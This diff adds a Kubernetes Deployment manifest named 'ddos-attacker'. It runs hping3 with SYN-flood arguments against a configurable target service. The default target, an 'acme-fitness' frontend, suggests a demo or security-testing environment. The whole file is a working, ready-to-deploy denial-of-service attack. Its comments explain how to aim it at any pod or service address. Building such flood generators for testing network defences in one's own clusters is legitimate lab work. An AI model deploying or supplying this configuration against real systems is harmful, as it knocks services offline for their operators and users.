@@ -1,0 +1,35 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  labels:
+    app: ddos-attacker
+  name: ddos-attacker
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: ddos-attacker
+  template:
+    metadata:
+      labels:
+        app: ddos-attacker
+    spec:
+      containers:
+      - image: sflow/hping3
+        name: hping3
+        env:
+        # Set TARGET_HOST/TARGET_PORT variables to your intended target
+        # For Pod use  pod-ip-address.namespace.pod.cluster-domain.local 
+        #  Example: 10-34-4-65.acme-fitness.pod.cluster.local
+        # For svc use svc_name.namespace.svc.cluster.local
+        #  Example : frontend.acme-fitness.svc.cluster.local
+        # Flood Mode, use with caution! 
+        - name: TARGET_HOST
+          value: "frontend.acme-fitness.svc.cluster.local"
+          #value: "10-34-1-13.acme-fitness.pod.cluster.local"
+        - name: TARGET_PORT
+          # if pod use port 3000, if svc, then 80
+          value: "80"
+        # -S --flood initiates DDoS SYN Flooding attack
+        command: ["/usr/sbin/hping3"]
+        args: [$(TARGET_HOST), "-p", $(TARGET_PORT), "-S", "--flood"]
